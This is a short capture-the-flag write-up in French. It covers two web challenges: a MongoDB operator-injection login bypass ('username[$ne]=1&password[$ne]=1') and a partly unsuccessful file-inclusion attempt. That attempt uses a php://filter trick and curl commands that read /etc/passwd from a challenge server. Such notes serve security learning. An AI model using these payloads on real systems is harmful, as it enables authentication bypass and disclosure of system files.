# Find me 1-3

## Find_me 1/3

Le site affiche une page d'accueil avec tout en bas écrit "MONGO", on devine qu'ils utilisent une db `mongodb`, après quelque recherche, envoyer une requête `POST` avec **BurpSuite** avec ce payload : 

`?username[$ne]=1&password[$ne]=1`, qui crée la requête :

```php
...array(
    username => array($ne => 1),
    password => array($ne => 1)
);
```

Ce qui veut dire : tous les utilisateurs sauf l'utilisateur `1` qui a comme mot de passe `1`, ce qui vaut toujours vrai à part si les deux valeurs valent `1`.

`=> username != 1 & password != 1`



src : [Mongodb is vulnerable to SQL injection in PHP at least | Application Security](https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/)

## Find_me 2/3 (did not succeed)

Sur le endpoint `/car-info.php?` ce script php utilise la fonction include depuis : 

`car-info.php?car=<fichier>` 

On pense à une exploitation `RFI` potentiel (inclure des fichiers distants dans le serveur herbergé)

Outils pour exploiter `RFI` :

- `gist`

- `ngrok`

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

Piste :

`php://filter/convert.base64-encode/resource=shell.php` en endpoint permet d'avoir le contenu de shell.php encodé en base64, on décode pour obtenir le code des fichiers

`curl` CLI connection :

- `curl -X POST -s http://213.32.7.237:<port>/login.php -c session.txt -d 'username[$ne]=1&password[$ne]=1'`
- `curl -s http://213.32.7.237:<port>/car-info.php?car=/etc/passwd -b session.txt`